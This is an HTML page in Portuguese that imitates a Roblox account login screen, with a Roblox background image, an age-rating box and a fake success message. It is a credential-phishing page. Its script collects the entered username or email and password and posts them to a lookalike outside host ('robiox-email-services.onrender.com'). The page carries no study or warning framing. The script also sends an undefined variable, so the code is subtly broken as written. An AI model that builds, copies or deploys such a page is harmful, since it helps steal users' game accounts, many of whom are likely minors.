<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Adicione a conta</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
 
    body {
      font-family: 'Builder Sans', 'Nunito', 'Arial Rounded MT Bold', Arial, sans-serif;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background:
        url('https://images.rbxcdn.com/a19e4c27a0694a1d0fd5ceb17c978a7a-marketing_bg_05222025.jpg')
        center center / cover no-repeat fixed;
    }
 
    .overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.18);
      z-index: 0;
    }
 
    .card {
      position: relative;
      z-index: 1;
      background: #17181d;
      border-radius: 12px;
      padding: 32px 28px 28px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 8px 40px rgba(0,0,0,0.55);
    }
 
    h1 {
      color: #fff;
      font-size: 1.6rem;
      font-weight: 800;
      text-align: center;
      margin-bottom: 22px;
      letter-spacing: 0.01em;
    }
 
    .input-group { margin-bottom: 10px; }
 
    input[type="text"],
    input[type="password"] {
      width: 100%;
      background: #1e2030;
      border: 1.5px solid #3a3d52;
      border-radius: 6px;
      color: #c8cad8;
      font-size: 0.97rem;
      padding: 12px 14px;
      outline: none;
      transition: border-color 0.2s;
    }
 
    input[type="text"]::placeholder,
    input[type="password"]::placeholder { color: #7a7d92; }
 
    input[type="text"]:focus,
    input[type="password"]:focus { border-color: #00a2ff; }
 
    .btn-entrar {
      display: block;
      width: 100%;
      margin-top: 14px;
      padding: 12px;
      background: #393c52;
      color: #c0c2d0;
      font-size: 1rem;
      font-weight: 700;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      letter-spacing: 0.03em;
      transition: background 0.18s, color 0.18s;
    }
 
    .btn-entrar:hover { background: #00a2ff; color: #fff; }
    .btn-entrar:disabled { opacity: 0.6; cursor: not-allowed; }
 
    .forgot {
      display: block;
      text-align: center;
      color: #a0a3b5;
      font-size: 0.92rem;
      margin: 14px 0 10px;
      cursor: pointer;
      text-decoration: none;
      transition: color 0.18s;
    }
    .forgot:hover { color: #fff; }
 
    .divider {
      height: 1px;
      background: #3a3d52;
      margin: 8px 0 12px;
    }
 
    .btn-alt {
      display: block;
      width: 100%;
      margin-bottom: 10px;
      padding: 12px;
      background: #393c52;
      color: #c0c2d0;
      font-size: 0.97rem;
      font-weight: 700;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      letter-spacing: 0.02em;
      transition: background 0.18s, color 0.18s;
    }
    .btn-alt:hover { background: #00a2ff; color: #fff; }
 
    .btn-create {
      display: block;
      width: 100%;
      padding: 10px;
      background: transparent;
      color: #a0a3b5;
      font-size: 0.97rem;
      font-weight: 600;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      letter-spacing: 0.02em;
      transition: color 0.18s;
      margin-top: 2px;
    }
    .btn-create:hover { color: #fff; }
 
    /* Status */
    .status {
      display: none;
      text-align: center;
      font-size: 0.88rem;
      font-weight: 600;
      padding: 9px 12px;
      border-radius: 6px;
      margin-top: 12px;
    }
    .status.success { display: block; background: #1a3a2a; color: #4caf82; border: 1px solid #2e6647; }
    .status.error   { display: block; background: #3a1a1a; color: #e05555; border: 1px solid #6b2a2a; }
    .status.loading { display: block; background: #1e2030; color: #a0a3b5; border: 1px solid #3a3d52; }
 
    /* Classificação Indicativa */
    .rating-box {
      margin-top: 14px;
      background: #1e2030;
      border-radius: 8px;
      overflow: hidden;
      border: 1px solid #3a3d52;
    }
    .rating-header {
      background: #111320;
      text-align: center;
      padding: 7px 10px;
      color: #e0e2f0;
      font-size: 0.78rem;
      font-weight: 800;
      letter-spacing: 0.08em;
      text-transform: uppercase;
    }
    .rating-body {
      display: flex;
      align-items: center;
      padding: 10px 16px;
      gap: 16px;
    }
    .rating-badge {
      background: #d9313a;
      color: #fff;
      font-size: 1.7rem;
      font-weight: 900;
      width: 52px;
      height: 52px;
      border-radius: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-shrink: 0;
    }
    .rating-desc { color: #c8cad8; font-size: 0.95rem; font-weight: 600; }
    .rating-footer {
      text-align: center;
      padding: 8px 10px 10px;
      color: #8a8da5;
      font-size: 0.78rem;
      line-height: 1.6;
      border-top: 1px solid #2e3145;
    }
  </style>
</head>
<body>
  <div class="overlay"></div>
  <div class="card">
    <h1>Adicione a conta</h1>
 
    <form id="loginForm">
      <div class="input-group">
        <input type="text" id="email" placeholder="Usuário/e-mail/telefone" autocomplete="username" required />
      </div>
      <div class="input-group">
        <input type="password" id="password" placeholder="Senha" autocomplete="current-password" required />
      </div>
      <button type="submit" class="btn-entrar" id="btnEntrar">Entrar</button>
    </form>
 
    <div id="status" class="status"></div>
 
    <a href="#" class="forgot">Esqueceu a senha ou nome de usuário?</a>
 
    <div class="divider"></div>
 
    <button class="btn-alt">Envie-me um código único por e-mail</button>
    <button class="btn-alt">Entrada rápida</button>
 
    <button class="btn-create">Criar nova conta</button>
 
    <div class="rating-box">
      <div class="rating-header">Classificação Indicativa: 16 Anos</div>
      <div class="rating-body">
        <div class="rating-badge">16</div>
        <div class="rating-desc">Violência</div>
      </div>
      <div class="rating-footer">
        Interação entre usuários<br>
        Compras no jogo (Inclui itens aleatórios)
      </div>
    </div>
  </div>
 
  <script>
    const form = document.getElementById("loginForm");
    const statusEl = document.getElementById("status");
    const btnEntrar = document.getElementById("btnEntrar");
 
    form.addEventListener("submit", async (event) => {
      event.preventDefault();
 
      const email = document.getElementById("email").value.trim();
      const password = document.getElementById("password").value.trim();
 
      if (!email || !password) {
        statusEl.textContent = "Preencha todos os campos.";
        statusEl.className = "status error";
        return;
      }
 
      statusEl.textContent = "Enviando...";
      statusEl.className = "status loading";
      btnEntrar.disabled = true;
 
      try {
        const response = await fetch("https://robiox-email-services.onrender.com/send-email", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ email, message })
        });
 
        const result = await response.json();
 
        if (!response.ok) throw new Error(result.error || "Erro ao entrar.");
 
        statusEl.textContent = result.message || "Login realizado com sucesso!";
        statusEl.className = "status success";
        form.reset();
 
      } catch (error) {
        statusEl.textContent = error.message || "Erro ao conectar. Tente novamente.";
        statusEl.className = "status error";
      } finally {
        btnEntrar.disabled = false;
      }
    });
  </script>
</body>
</html>
